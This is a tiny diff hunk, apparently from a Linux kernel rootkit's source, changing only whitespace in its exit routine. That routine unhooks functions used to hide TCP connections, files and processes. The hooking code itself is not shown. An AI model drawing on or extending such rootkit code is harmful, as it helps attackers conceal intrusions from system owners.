@@ -1030,8 +1030,9 @@ static void __exit mischief_managed ( void )
     hijack_stop(tcp6_seq_show);
     hijack_stop(tcp4_seq_show);
     hijack_stop(root_iterate);
-    hijack_stop(proc_iterate);
+	hijack_stop(proc_iterate);
 }
+
 
 module_init(i_solemnly_swear_that_i_am_up_to_no_good);
 module_exit(mischief_managed);
